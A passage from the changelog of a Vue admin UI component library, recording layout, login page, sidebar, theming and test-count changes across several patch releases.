  onUserCenter, onLogout, signedIn, onSignIn }`. Consumers (the reference app
  et al.) configure once via `defineAdminApp({ login: { user: … } })`
  and the header dropdown wires up.
- Components exported from `@tnzi/ui-admin/components`:
  `TAdminAutoBreadcrumb`, `TAdminUserAvatar`.

**Changed** (`@tnzi/ui-admin`):

- `TAdminHeader` no longer auto-renders the `title` prop as a logo
  fallback. The logo lives in `TAdminSidebar` in vertical layout
  modes (Phase I.7.6); consumers wanting the title in the header opt
  in via `<template #logo>`. Both `logo` and `breadcrumb` slot
  containers now use `v-if="$slots.logo/breadcrumb"` so they
  collapse to nothing when unused.
- `AdminShellRoot` now defaults the `#header-breadcrumb` slot to
  `TAdminAutoBreadcrumb` and the `#header-user` slot to
  `TAdminUserAvatar`. Consumer overrides via `<template
  #header-breadcrumb>` / `#header-user` on `<TAdminShell>` still
  win.
- `defaultTranslate` signature widened from `(key) => string` to
  `(key, fallback?) => string` so missing-key paths return the
  caller's fallback instead of the raw key.

**Cross-repo** (reference consumer):

- `admin/src/main.ts` adds `login.user.onLogout` (calls
  `auth.logout()` then redirects to `/login`) so the header
  dropdown is fully wired with no extra component edits.

**Tests**:

- `TAdminHeader` test "renders default title when no logo slot"
  updated to assert the new collapsed-when-empty behaviour.

Visual verification (Chrome side-by-side against localhost:9527):

- Header left shows `<toggler> Identity / Users` with mdi icons
  beside each crumb.
- Header right ends with avatar icon + "Admin" label; clicking opens
  the dropdown with "User Center" / "Logout" rows.

Tests: 659 (`@tnzi/ui-admin`).

Remaining for Phase I.7 (per brief): I.7.3-I.7.5 (CodeLogin /
Register / ResetPwd / 2FA), I.7.8 (TAdminTabs chrome tabs auto-push),
I.7.9 (TAdminFooter visibility fix), and the deferred default
Dashboard page.

## [0.2.27] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.6: TAdminSidebar parity — logo + menu icons + active polish)

Soybean-parity overhaul for the admin sidebar, driven by side-by-side
review against `localhost:9527`. Three structural gaps closed.

**Added** (`@tnzi/ui-admin`):

- `router/routeIcons.ts` — curated mdi icon map keyed by route `name`
  for the 42 built-in admin pages (top-level modules + 38 sub-routes:
  identity / authorization / system / storage / audit / notification /
  chat / payment / ai / template). Picks follow soybean's outline
  vocabulary so a paste-side-by-side review feels consistent.
- `useAdminRouteStore.toMenuItem` now resolves `meta.icon` first and
  falls back to the new `DEFAULT_ROUTE_ICONS` map — consumers can still
  override per-route by setting `meta.icon` themselves.
- `TAdminSidebar.brand` + `brandIcon` props. The sider's `#header` slot
  now defaults to `<TSystemLogo>` showing the brand title + icon,
  collapsing to icon-only when the sider is folded. Consumer can still
  override the entire header via `<template #sider-header>`.
- `TAdminShell.sider.brand` + `sider.brandIcon` config fields, plumbed
  through to `TAdminSidebar`.
- `AdminShellRoot` wires `useAdminLoginConfig().brand` / `brandIcon`
  through to the sider header, so the login page and sidebar share the
  same brand identity without duplicate configuration.

**Changed** (`@tnzi/ui-admin`):

- `TAdminSidebar` active-menu signal: was `tabStore.activeTabId` (only
  updated on tab open), now `useRoute().name` directly — so the active
  row highlights on initial page load. Wrapped in a router-context
  guard so isolated unit-test mounts (no router installed) gracefully
  fall back to "no active route".
- `TAdminSidebar` auto-expands the active item's ancestor groups on
  route change (`expandedKeys` is now controlled with an immediate
  watcher), so landing on `/admin/identity/users` opens the `identity`
  group without a manual click. User toggles are preserved.
- `TAdminSidebar` NMenu CSS overhauled to match soybean: `--n-item-height: 44px`,
  `--n-item-color-hover: rgb(var(--tnzi-primary-rgb) / 0.06)`,
  `--n-item-color-active: rgb(var(--tnzi-primary-rgb) / 0.1)`. Active
  row gets a 3px primary left-border via a `::before` pseudo-element,
  matching soybean's signature accent.
- `TAdminSidebar.t-admin-sidebar__header` no longer renders a bottom
  border (logo-to-menu transition is seamless in soybean).
- Menu options now carry an `icon` render function pointing to
  `TSvgIcon` so icons appear left of each label.

**Cross-repo** (reference consumer):

- `admin/vite.config.ts` adds `resolve.alias` + `resolve.dedupe` for
  `vue` / `vue-router` / `pinia` / `naive-ui` so the pnpm `link:` to
  the ui-admin package doesn't load duplicate copies of those modules.
  Without this, ui-admin's internal `useRoute()` reads from a router
  that the consumer never installed (always returns `name: undefined`),
  which silently breaks active-menu highlighting and parent expansion.

**Test fixes**:

- `TAdminSidebar` test "binds active value to tabStore.activeTabId"
  renamed + rewired to assert the new no-router fallback (empty
  active key). The `useAdminTabStore` import is gone.

Tests: 659 (`@tnzi/ui-admin`) — green.

Visual verification (Chrome side-by-side against localhost:9527):

- Sidebar header shows the brand logo + title.
- Each menu row has its mdi icon.
- Active row (User Management when on `/admin/identity/users`) has
  the purple wash + 3px left-border accent.
- Active row's parent group (Identity) is auto-expanded on first load.

Remaining post-login layout gaps (header user dropdown, breadcrumb,
tab bar, footer copyright, default dashboard page) stay open for
Phase I.7.7-I.7.9.

## [0.2.26] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.2 visual polish: WaveBg blobs + naive theme override + default switches)

Driven by side-by-side comparison with `localhost:9527` (soybean demo):
three visual gaps the I.7.2 commit shipped wrong, all fixed here.

**Breaking** (`@tnzi/ui-admin`):

- `TWaveBg` API replaced. Was `{ height?, reverse?, opacity? }` with three
  horizontal sine-wave layers; now `{ themeColor? }` with two organic SVG
  blob paths (top-right + bottom-left) gradient-filled from the theme
  primary. Source-fidelity port of
  `soybean-admin-example/src/components/custom/wave-bg.vue` — same path
  data, same offsets, same gradient stops via `getPaletteColorByNumber`.
  Consumers of `TWaveBg` that relied on the old props get a clean blob
  fill instead — the old sine layers are gone for good.
- `TWaveBg` unit tests updated to the new 2-SVG shape + gradient-stop
  assertion (3 deletions, 2 additions; net 661 → 659 ui-admin tests).

**Changed** (`@tnzi/ui-admin`):

- `TLoginPage` toolbar slot now renders a `TThemeSchemaSwitch` +
  `TLangSwitch` pair by default (was empty). Consumer can still override
  via `<template #toolbar>`. This brings parity with soybean's
  `index.vue` header — the slot is no longer "empty by default but
  consumer-supplied".
- `TLoginPage` no longer applies the `--t-login-wave-tint` inline CSS
  var to `TWaveBg` (the prop is now `themeColor` and reactive).

**Cross-repo** (reference consumer):

- `admin/src/App.vue` now consumes `useTheme()` from `@tnzi/ui` to
  forward the admin theme context to `NConfigProvider`'s
  `:theme-overrides` (without this, `NButton type="primary"` etc.
  fell back to naive's default green `#18a058` instead of the admin
  signature purple `#646cff`). Also adds `NLoadingBarProvider` +
  `NNotificationProvider` so the matching primitives work everywhere.

**Visual verification** (Chrome side-by-side against localhost:9527):

- Login page now matches soybean's centered card on the blob-tinted
  background, with purple primary on Sign in / Admin demo buttons, and
  theme/language switchers in the top-right corner of the card.
- Admin shell post-login (`/admin/identity/users`) inherits the purple
  primary (Create button, pagination, etc.). Sidebar / Header / Tabs /
  Breadcrumb visual gaps vs soybean stay open for Phase I.7.6-I.7.9.

Tests: 661 → 659 (`@tnzi/ui-admin`) — net -2 from TWaveBg API breakage,
all green; visual checked via Chrome devtools.

## [0.2.25] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.2: PwdLogin wired + unocss adopted)

Closes the gap user feedback identified: `@tnzi/ui` and `@tnzi/ui-ai` both
adopt unocss, but `@tnzi/ui-admin` was still BEM-only. This patch wires
unocss in (vite plugin + `uno.config.ts` + `import 'virtual:uno.css'` in
the root entry), then rewrites `TLoginPage` and the new `PwdLogin`
module to use the same atom vocabulary soybean-admin-example does
(`flex-y-center` / `justify-between` / `gap-12px` / `text-28px` /
`text-primary` / `rd-12px`). The atoms get pre-compiled into
`dist/style.css` — consumers don't need to install unocss themselves.

**Added** (`@tnzi/ui-admin`):

- `uno.config.ts` — mirrors `@tnzi/ui` preset (presetWind4 + presetIcons),
  plus soybean-style shortcuts (`flex-y-center`, `i-flex-col`).
- `unocss` devDependency (^66.6.8) — matches `@tnzi/ui`.
- `src/index.ts` now imports `'virtual:uno.css'` so the atoms ship in
  the compiled bundle.
- `useAdminLoginConfig()` composable + `ADMIN_LOGIN_CONFIG_KEY` injection
  key + `AdminLoginConfig` type. Consumers configure the built-in login
  route via `defineAdminApp({ login: { brand, callbacks, demoAccounts } })`.
  The route component (`pages/login/index.vue`) injects the config and
  forwards it to `TLoginPage`.
- `TnziUiAdminOptions.login` field on `createTnziUiAdmin()` — same
  config shape, for consumers using the plugin factory directly instead
  of `defineAdminApp`.
- `DefineAdminAppOptions.login` field on `defineAdminApp()` factory.
- `LoginDemoAccount` type (replaces the inline `DemoAccount` exported
  by the deprecated `TAdminLoginCard`).

**Changed** (`@tnzi/ui-admin`):

- `TLoginPage.vue` — entire BEM stylesheet (~140 lines of scoped CSS)
  replaced with unocss atoms matching the soybean reference 1:1. Brand
  header + module label use `text-28px text-primary font-500` /
  `text-18px text-primary font-500`. NCard width `w-400px lt-sm:w-300px`.
  Layout `flex-center min-h-screen flex-y-center justify-between gap-12px`.
- `PwdLogin.vue` — fully wired:
  - NForm + NFormItem (path: userName / password) using `useFormRules` +
    `useNaiveForm` from `@tnzi/ui-admin/headless`.
  - Calls `useLoginContext().callbacks.pwdLogin({ userName, password, remember })`.
  - "Forgot password?" link calls `toggleLoginModule('reset-pwd')`.
  - "Code login" / "Register" secondary buttons call
    `toggleLoginModule('code-login' | 'register')`.
  - "Other Account Login" divider + demo account quick-fill buttons
    (auto-fills + submits via `handleAccountLogin`).
  - Error display under the form when callback rejects.
  - Hidden when `demoAccounts` is empty.
- `TLoginPage` test selectors switched to `data-test="…"` attributes so
  the BEM→atom rewrite doesn't churn tests.
- `LoginContext.demoAccounts` added — `TLoginPage` injects, `PwdLogin`
  consumes.

**Cross-repo**:

- The reference app's `admin/src/main.ts` now configures the built-in login via
  `defineAdminApp({ login: … })` instead of overriding the route
  component. `pages/LoginPage.vue` deleted. Smoke-tested: Admin demo
  account quick-fill → `/auth/login-with-refresh-token` → JWT issued →
  redirect to `/admin/identity/users` works end-to-end.

Tests: 661 (`@tnzi/ui-admin`) — unchanged; `data-test` attribute switch
preserved coverage. Visual verified via Chrome devtools.

## [0.2.24] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.1: login page router-param shell + 5 module scaffold)

Opening commit of Phase I.7 — the pixel-perfect soybean replication
push. `TLoginPage` was reworked from a `centered`/`split` variant
toggle into a **router-param driven shell** that mirrors
`soybean-admin-example/src/views/_builtin/login/index.vue` 1:1.

**Breaking** (`@tnzi/ui-admin`):

- `TLoginPage` props re-shaped. The `variant` (`centered`/`split`)
  toggle, `tagline`, `cardTitle`, `cardSubtitle`, `demoAccounts`,
  `enableCodeLogin`, `defaultUserName`, `defaultPassword`, `onLogin`,
  `translate` (single-arg signature) props are all removed. The new
  shape: `{ module?, moduleComponents, brand?, brandIcon?,
  brandIconSize?, translate? (two-arg with fallback), callbacks?,
  moduleLabels?, onToggleModule?, transitionName? }`. The single
  retained layout matches soybean's centered card on a brand-tinted
  background with `TWaveBg` underneath.
- `TLoginPageVariant` type export removed.
- `/login` route definition in `defaultAdminRoutes` is now
  `/login/:module(pwd-login|code-login|register|reset-pwd|bind-wechat)?`.
  Consumers that used path-equality match on `'/login'` should switch
  to name match on `'login'` (the route `name` is unchanged).
  `defineAdminApp({ loginComponent })` now resolves the override by
  name, so the public consumer-facing API is unchanged.

**Added** (`@tnzi/ui-admin`):

- `pages/login/index.vue` — route component that reads
  `route.params.module`, validates against the known 5-module set,
  and forwards to `TLoginPage` along with `router.replace`-based
  `toggleLoginModule`.
- `pages/login/modules/{PwdLogin,CodeLogin,Register,ResetPwd,BindWechat}.vue`
  — five placeholder modules. Phase I.7.2–I.7.5 will replace each
  placeholder with the real soybean-parity form wired to the
  `Tnzi.Identity` controller endpoints (`/auth/login-with-refresh-token`,
  `/auth/code-login/send-code` + `/auth/code-login`, `/auth/register`
  or `/auth/quick-register` + `/auth/quick-register/send-code`,
  `/auth/password-recovery/send-code` + `/auth/password-recovery/reset`,
  `/auth/verify-2fa` + `/auth/send-2fa-code`).
- `pages/login/useLoginContext.ts` — provide/inject channel between
  `TLoginPage` and the modules. Exposes `translate(key, fallback)`,
  `toggleLoginModule(name)`, and a `callbacks` bag of Promise-returning
  auth functions. Modules call this; the shell provides; the route
  page wires the consumer's HTTP client to the callbacks.
- Top-level `@tnzi/ui-admin` exports: `TnziAdminLoginPage`,
  `PwdLoginModule`, `CodeLoginModule`, `RegisterModule`,
  `ResetPwdModule`, `BindWechatModule`, plus context types
  (`LoginContext`, `LoginModule`, `LoginCallbacks`,
  `PwdLoginPayload`, `CodeLoginPayload`, `RegisterPayload`,
  `ResetPwdPayload`, `SendCodePayload`).

**Added** (`@tnzi/ui` 0.2.3):

- `mixColor(from, to, ratio)` exported from `@tnzi/ui/theme/palette`.
  Linear blend using colord's mix plugin, with ratio clamping. Soybean
  uses `mixColor('#ffffff', themeColor, 0.2)` (dark: 0.5) to derive the
  login page background wash; `TLoginPage` adopts the same recipe.

Tests: 660 → 661 (`@tnzi/ui-admin`); 444 → 449 (`@tnzi/ui`, +5 for
`mixColor`).

Coordination: Phase I.7 follow-up brief
(`memory/phase-i7-pixel-perfect-replication-brief.md`) covers I.7.2
through I.7.12 — they will land in subsequent commits in fresh
sessions per the brief's "do not stuff one session" rule.

## [0.2.23] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.7: dark mode transition + mix layout hover)

Closing patch for Phase I.6 — two polish-grade additions:

- **`TDarkModeContainer` smooth transition.** New `transition` prop
  (defaults to `'smooth'`) wraps the local theme flip in a 300 ms
  crossfade on background / color, plus a 250 ms cascade for child
  borders and backgrounds. Pass `transition="none"` for full-page
  hard-flips where animation would feel sluggish.
- **Mix layout hover-slide primitive.** New `.t-mix-hover-trigger` /
  `.t-mix-hover-trigger__sub` CSS pair in `styles/transition.css`. The
  narrow first-level rail (90 px, `mixSiderWidth`) expands a hidden
  second-level panel from 0 → `--tnzi-admin-sider-mix-child-width`
  (200 px) on hover / focus / a toggled `--expanded` class. Uses a
  spring ease curve (`cubic-bezier(0.16, 1, 0.3, 1)`) for the soybean
  feel. Consumer wires the `.t-mix-hover-trigger__sub` content to
  whatever second-level menu they render — the primitive is purely
  presentational so adopters can A/B different render strategies.

Tests: 658 → 660 (2 new — transition class default + opt-out, both on
TDarkModeContainer).

## [0.2.22] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.6: theme presets + radius + import/export)

This patch lays the foundation for the eventual 5-tab → 4-tab Theme
Drawer rework. The visual drawer rewrite is intentionally deferred
because the existing 721-line TThemeDrawer covers the same surface
and rewriting it well exceeds a single patch's reasonable scope; this
patch adds the **data** the new tabs will need so that swap can land
later as a pure UI shuffle.

- **Four built-in presets** in `src/presets/index.ts`, exported from
  `@tnzi/ui-admin` and the `/presets` subpath:
  - `default` — soybean violet (#646cff), 6 px radius, light scheme
  - `dark` — same palette, dark scheme, 8 px radius
  - `compact` — tighter sider / header / tab heights, 4 px radius
  - `azir` — cyan brand variant (#0ea5e9), 8 px radius
- **`themeRadius` in `useAdminThemeStore`** — 0-16 px clamp, persists
  to LocalStorage, syncs `--tnzi-admin-radius` CSS variable on every
  set so cards / inputs / buttons pick it up live.
- **`applyPreset(preset)`** action on the theme store — patches
  radius, sider widths, header / tab heights, and page transition
  from a `ThemePreset` shape. Color values live in `@tnzi/ui`'s base
  theme store; consumers wire `themeStore.setPrimary(preset.primaryColor)`
  separately to keep the two layers decoupled.
- **`exportThemeConfig(snapshot) / importThemeConfig(json)`** helpers —
  versioned JSON wrapper (`version: 1`) with download-ready shape;
  throws on malformed / version-mismatched payloads. Consumer typically
  pairs them with a file picker / blob download to expose import /
  export buttons in the (future) Preset tab.

Tests: 646 → 658 (12 new across preset shape sanity, applyPreset side
effects, setThemeRadius clamping, and import/export roundtripping).

## [0.2.21] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.5: Tab enhancement + KeepAlive RouterView)

`TAdminTabs` already shipped drag-reorder + 5-option context menu
(close current / left / right / others / all) + middle-click close, so
this patch focuses on the missing piece: a drop-in
**`TAdminRouterView`** that wires up KeepAlive + Transition the way
soybean-admin does:

- `<KeepAlive>` with `:include="visibleRouteNames"` + `:max="20"`. Each
  route opt-ins via `meta.keepAlive` (default true) and opts out by
  setting `meta.keepAlive: false` or appearing in the `exclude` prop.
  Anonymous routes (no `name`) are always skipped.
- `<Transition>` using whatever `useAdminThemeStore().pageTransition`
  reports (six built-ins, prefixed `tnzi-`). Respects `pageAnimate`.
- `appStore.reloadFlag` reactivity — clicking the header reload
  button unmounts the inner component and immediately re-mounts it,
  blowing the cache for that slot. The `v-if="reloadFlag"` guard is
  enough; KeepAlive picks up the remount automatically.

Drop into TAdminContent's slot:

    <TAdminContent>
      <TAdminRouterView :exclude="['login', '403', '404']" />
    </TAdminContent>

Tests: 640 → 646 (6 new — smoke / cache navigation / `meta.keepAlive:
false` exclusion / anonymous-route skip / `exclude` prop / reloadFlag
unmount-remount cycle).

## [0.2.20] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.4: Dashboard content expansion)

Three additions that lift the default dashboard from "scaffold" to
something an operations team would actually leave open all day:

- **`KpiCard.gradient`** — new field accepts `{ start, end }` and renders
  the whole card as a 135deg gradient tile (white text, no icon chip).
  Matches soybean's quartet of red→purple / purple→blue / cyan→blue /
  yellow→red KPI cards. The legacy `tone` path stays intact when
  `gradient` is unset.
- **`KpiCard.unit`** — optional prefix shown before the TCountTo number
  (e.g. `$`, `€`, `¥`). Renders at 18 px / weight 500 so it stays a
  modifier rather than competing with the value.
- **`<slot name="header">`** on `TDashboardPage` — typically populated
  with a `THeaderBanner` (see below) so consumers can drop in their
  welcome ribbon without restructuring the page.
- **`THeaderBanner`** (new, `components/dashboard/`) — welcome banner
  with auto time-of-day greeting (`morning` 5-11, `afternoon` 12-17,
  `evening` 18-22, `night` 23-4), live ticking datetime, optional
  subtitle motto, and an `illustration` slot. Pure presentational —
  consumer wires `userName` from auth store.
- **`TProjectTimeline`** (new, `components/dashboard/`) — naive-ui
  NTimeline wrapper for activity feeds. Items take title / description /
  time / icon / tone — soybean's "project news" card pattern in 30 lines.

All three exports are reachable from the package root and the
`/components` subpath. Tests: 630 → 640 (10 new across the three).

## [0.2.19] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.3: utility component suite)

Seven small, focused components that headers / toolbars / brand-areas /
login-pages all reach for. Each lives in `src/components/utility/`,
exports from the package root, and stays presentational (no store
coupling) so consumers can wire them into vue-i18n / theme stores /
router however they like:

- **`TThemeSchemaSwitch`** — cycle Light → Dark → Auto, optionally toggle
  the `dark` class on `<html>`. Controlled or uncontrolled.
- **`TLangSwitch`** — naive-ui NPopselect-backed locale picker; defaults
  to en + zh-CN, overridable via `options`.
- **`TFullScreen`** — Fullscreen API toggle with state-tracking icon
  flip. Falls back to a no-op on browsers that reject the request.
- **`TReloadButton`** — refresh icon with a 360-degree spin animation.
  Accepts an async `onReload` callback (awaits it) or fires-and-forgets
  with a short visual confirmation.
- **`TPinToggler`** — pin / unpin used by mix-layout sub-sider to lock
  the second-level drawer open.
- **`TMenuToggler`** — collapse / expand sidebar; icon flips with state.
- **`TSystemLogo`** — brand mark + caption with three layouts (full /
  icon-only / stacked) for sidebar / collapsed / login use.

Each component is a tiny wrapper over the existing `TButtonIcon` /
`TSvgIcon` primitives, so they pick up the recent NButton restoration
fix and theme tokens automatically.

Tests: 615 → 630 (15 new across the seven components covering
mount / click / emit / layout-mode / pinned-state / async-callback
scenarios). The fall-through `class` attribute is not tested on
TButtonIcon-based components — NTooltip's binder eats the class on its
trigger wrapper, so tests focus on emit + DOM presence instead.

## [0.2.18] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.1: visual polish + route progress + NButton restoration)

Three targeted fixes / additions to back the new TLoginPage:

- **NButton restoration.** Tailwind / UnoCSS preflight emits
  `button, [type="submit"], … { background-color: transparent }` with
  specificity `(0,1,0)`, which ties with `.n-button { background-color:
  var(--n-color) }` and wins by cascade order — so every primary / info /
  success / warning / error NButton rendered as a transparent outline with
  white text on white surfaces, basically invisible. Added a `.n-button.n-
  button` double-class rule (specificity `(0,2,0)`) in `styles/polish.css`
  restoring the var-driven background / border for default / hover /
  pressed / focus / disabled states. Applies app-wide so login, dialog,
  popover, and admin-shell buttons all recover at once.
- **Layout content background tint.** `--tnzi-admin-content-bg` now mixes
  5 % primary into the layout background (`color-mix(in srgb, …)`), so
  cards lift off the surface the way soybean's content area does instead
  of sitting on a flat grey.
- **Route progress bar.** New `useRouteProgress(router)` headless +
  pure-CSS bar (no `nprogress` dep). The composable toggles
  `<html data-tnzi-route-loading>` around each navigation, and a
  global `html::before` rule grows a 2 px primary-tinted bar across the
  top of the viewport during nav, fading out two animation frames after
  the route resolves. `defineAdminApp().install(app, pinia, router?)`
  picks it up automatically when the router is passed in.
- New variables in `styles/variables.css`:
  `--tnzi-admin-nprogress-color`, `--tnzi-admin-nprogress-height`.

Tests: 611 → 615 (4 new for `useRouteProgress` covering set / clear /
idempotent / concurrent cases).

## [0.2.17] — 2026-05-15 (`@tnzi/ui-admin` Phase I.6.2: TLoginPage centered variant + form rules)

Reworked `TLoginPage` to default to the soybean-admin **centered** layout (logo
+ title stacked above a single card, WaveBg footer, optional top-right
toolbar slot for theme/lang switchers). The previous split-pane layout is
retained behind `variant="split"` so existing consumers can opt in.

`TAdminLoginCard` now:

- exposes a `variant` of its own (`'page'` = full-page wrapper, `'standalone'`
  = bare card; the page wraps it as `'standalone'` to avoid double chrome);
- moves validation to `NForm` `:rules` (inline field errors, no manual
  `errorText` state) — easier to extend with custom rules;
- ships the button as `round size="large"` (44 px) and bumps the subtitle to
  18 px / weight 500 for the marquee headline feel.

### Note on version history

`0.2.6` through `0.2.16` shipped without CHANGELOG entries; the work is tracked
in memory (`2026-05-15-ui-admin-soybean-parity.md`) and the corresponding
commits. Future Phase I.6.x patches will document their changes here.

## [0.2.5] — 2026-05-15 (`@tnzi/ui-admin` Phase A.5: visual polish, CSS var alignment)

Patch inserted before Phase C after a live consumer flagged the
"basically no visible change" issue. Phase A's drawer + layout work was
landing in source but the rendered components looked identical to pre-A
because of two compounding bugs:

1. **Critical theme-context-missing bug (already shipped in `7bf20274`)** —
   `AdminShellRoot` was eagerly mounting `TThemeDrawer`, which calls
   `useTheme()` from `@tnzi/ui`. Consumers that don't install
   `createTnziUi()` (consumer pattern: uses Naive UI directly + only
   `@tnzi/ui-admin`) hit "no theme context found" during drawer setup, the
   whole route subtree silently failed, and none of the Phase A features
   reached the DOM. Fix landed before this release: `createTnziUiAdmin()`
   now provides a fallback theme context when none is already provided.
2. **CSS variable name mismatch** — `@tnzi/ui` injects `--tnzi-primary`,
   `--tnzi-base-text`, `--tnzi-container-bg`, `--tnzi-border`,
   `--tnzi-shadow-*`. But `@tnzi/ui-admin` components (TAdminShell, Sidebar,
   Header, Tabs, Breadcrumb, Footer, GlobalSearch, ThemeDrawer, LayoutModeCard)
   referenced `--tnzi-primary-color`, `--tnzi-text-color-1`, `--tnzi-sider-bg`,
   `--tnzi-surface`, `--tnzi-border-color`, `--tnzi-hover-bg`,
   `--tnzi-error-color` etc — none of those exist. CSS variables silently
   resolved to undefined and the fallback colors took over inconsistently:
   sidebar background went transparent, hover states didn't show, shadows
   never rendered, "样式无法识别".

### Packages bumped

| Package          | From  | To    |
|------------------|-------|-------|
| `@tnzi/ui-admin` | 0.2.4 | 0.2.5 |

### Fixed — `@tnzi/ui-admin`

- **CSS variable name alignment** across 9 layout components: 19 wrong-name
  references replaced with their `@tnzi/ui`-injected counterparts. Components
  now correctly receive theme colors, hover backgrounds, and shadow tokens
  reactively when the user picks a color in the Settings Drawer.

### Changed — `@tnzi/ui-admin`

- **Emoji icons → Iconify SVG** in `TAdminHeader`: ☰ → `mdi:menu`/`mdi:menu-open`,
  🔍 → `mdi:magnify`, ↻ → `mdi:refresh`, ⤢/⤡ → `mdi:fullscreen`/`fullscreen-exit`,
  🎨 → `mdi:palette-outline`, lang button now combines `mdi:translate` + text label.
  Buttons standardized as 36×36 rounded squares with consistent hover + active
  states pulling from `--tnzi-primary-100` and `--tnzi-primary`.
- `TAdminHeader` adds `box-shadow: var(--tnzi-shadow-header, ...)` and tighter
  spacing (gap 8 → 12px) matching soybean-admin's chrome.
- `TAdminSidebar` gains `box-shadow: var(--tnzi-shadow-sider, ...)`, a
  16px-padded header row matching the header height (56px), 8px vertical
  padding on body, and 6px-rounded NMenu items with 2/8px margins for
  proper "pill" hover affordance.

### Added — `@tnzi/ui-admin`

- `@iconify/vue@^5.0.0` as a runtime dependency (matches `@tnzi/ui`'s version).

### Test coverage

- 536 tests still pass — test selectors preserved by keeping the original
  per-button CSS class names (`__toggler`, `__search`, `__reload`,
  `__fullscreen`, `__lang`, `__theme`) alongside the new shared
  `__icon-btn` class.

### Live consumer validation

The reference admin app (fresh dev) shows:
- 6 SVG icon buttons rendered (was 0 SVG + 5 emoji)
- Sidebar background `rgb(255, 255, 255)` (was `rgba(0,0,0,0)` transparent)
- Sidebar shadow `2px 0 8px rgba(29,35,41,0.05)` (was `none`)
- Header shadow `0 1px 4px rgba(0,21,41,0.08)` (was `none`)
- 70 `--tnzi-*` CSS variables correctly injected on `<html>`

## [0.2.4] — 2026-05-15 (`@tnzi/ui-admin` Phase B: module manifest + defineAdminApp)

Second patch of the `@tnzi/ui-admin` 0.2.x overhaul. Phase B ships the
user-facing extensibility milestone — backend-driven module discovery plus
a `defineAdminApp()` factory that compresses ~110 lines of consumer
bootstrap boilerplate into ~10 lines.

### Packages bumped

| Package          | From  | To    |
|------------------|-------|-------|
| `@tnzi/ui-admin` | 0.2.3 | 0.2.4 |

### Added — backend (`Tnzi.AspNetCore`)

- **`GET admin/diagnostics/admin-manifest`** — new diagnostics endpoint
  returning `AdminManifestDto`: per loaded module, the admin controllers it
  exposes with route + HTTP methods + `IsDefault` + `HasFullCrud` flags.
  Designed for frontend menu auto-generation.
- `AdminManifestDto`, `AdminModuleEntryDto`, `AdminEntityEntryDto` —
  frontend-shaped DTOs in `Tnzi.AspNetCore.Dtos`. Existing
  `GET admin/diagnostics/modules` endpoint untouched (backward-compat).

### Added — `@tnzi/ui-admin`

- **`defineAdminApp({...})` factory** in `@tnzi/ui-admin/plugin`:
  - `hideModules` / `showOnlyModules` — case-insensitive filter on the
    second-level (module) children of `/admin`. Hidden modules' routes are
    stripped wholesale.
  - `overridePages` — map of `routeName → Component` that swaps the
    `component` field deep in the tree without touching `meta` / permission
    checks / keepAlive.
  - `addModules` — append consumer-supplied `RouteRecordRaw[]` under
    `/admin` for business-specific pages.
  - `loginComponent` / `forbiddenComponent` — replace the placeholder
    `/login` and `/403` routes.
  - `install(app, pinia)` — wraps `createTnziUiAdmin()` + seeds the admin
    route store from the filtered routes so `TAdminSidebar` renders the
    menu out of the box (no consumer hydration code needed).
- **`useAdminModuleManifest()` composable** in `@tnzi/ui-admin/headless`:
  fetches the backend manifest, exposes filtered modules + a derived
  `menuTree` (collapses single-entity modules to leaf nodes).
- **`fetchAdminManifest(client)` service** in
  `@tnzi/ui-admin/services/admin-manifest` (re-exported from root) — bare
  fetch helper with safe null fallback when the endpoint is unavailable.

### Consumer impact

Existing consumers using `createTnziUiAdmin()` directly are unaffected
(no breaking changes). Consumers can opt into `defineAdminApp()` to
remove route-filtering / store-hydration / login-replacement boilerplate.

The reference `admin/main.ts` migration: ~110 lines → ~50 lines
(the residual ~50 lines is `vue-router` setup + `beforeEach` auth guard +
`pnpm link:` Vue typedef casts; those don't belong in the framework
factory).

### Test coverage

- `@tnzi/ui-admin` 513 → 536 tests (+23):
  - `admin-manifest` service: 4 tests (200 ok, no data, missing modules,
    network error)
  - `useAdminModuleManifest`: 8 tests (manifest verbatim, disabled-module
    filter, hideModules/showOnlyModules, 2-level menu, single-entity
    collapse, i18n key convention, refresh, isAvailable)
  - `defineAdminApp`: 10 tests (default tree, hide/showOnly, deep
    override, addModules, login/forbidden swap, install seeds route store,
    uninstall hook, case-insensitive normalization)
- Build green, vue-tsc green.

## [0.2.3] — 2026-05-15 (`@tnzi/ui-admin` Phase A: layouts + theme drawer)

First release of the `@tnzi/ui-admin` 0.2.x overhaul aimed at production-grade
admin UX (benchmark: soybean-admin). This patch ships Phase A — layout modes,
dual-level theme integration, and a 5-tab settings drawer. Other `@tnzi/*`
packages keep their `0.2.2` version (no source changes for them yet).

### Packages bumped

| Package          | From  | To    |
|------------------|-------|-------|
| `@tnzi/ui-admin` | 0.2.2 | 0.2.3 |

### Added — `@tnzi/ui-admin`

- **6 layout modes** in `useAdminThemeStore.layoutMode`: `vertical` (default),
  `horizontal`, `vertical-mix`, `vertical-hybrid-header-first`,
  `top-hybrid-sidebar-first`, `top-hybrid-header-first`. `TAdminShell`
  dispatches main-sider / sub-sider / top-menu rendering per mode.
- **`TAdminTopMenu` component** — horizontal NMenu hosted inside the header
  for `horizontal` (full nested) and the 3 hybrid modes (first-level only).
- **`TAdminWatermark` component** — `NWatermark` overlay wired to
  `useAdminThemeStore.watermark`. Default off; consumer apps enable via the
  Settings Drawer or by patching the store. Composes `{customText} · {userName}
  · {YYYY-MM-DD}` based on toggles.
- **`TLayoutModeCard` component** — visual SVG-style 4:3 preview card for each
  of the 6 layout modes; used by the Settings Drawer's Layout tab.
- **`useAdminThemeStore` new fields**: `mixSiderWidth`, `tabStyle`
  (chrome/button/slider), `pageAnimate`, `fixedHeader`, `fixedTab`,
  `fixedFooter`, `watermark` (enabled/text/includeUserName/includeDate/opacity/
  fontSize). All persisted via `pinia-plugin-persistedstate`.
- **`theme/admin-config.ts`** — snapshot serialization (`buildSnapshot`,
  `snapshotToJson`, `parseSnapshot`, `isValidSnapshot`,
  `copySnapshotToClipboard`, `downloadSnapshot`). Versioned (`v1`) so future
  schema changes can migrate.
- **`TAdminHeader` `#menu` slot** — new center region between left (logo +
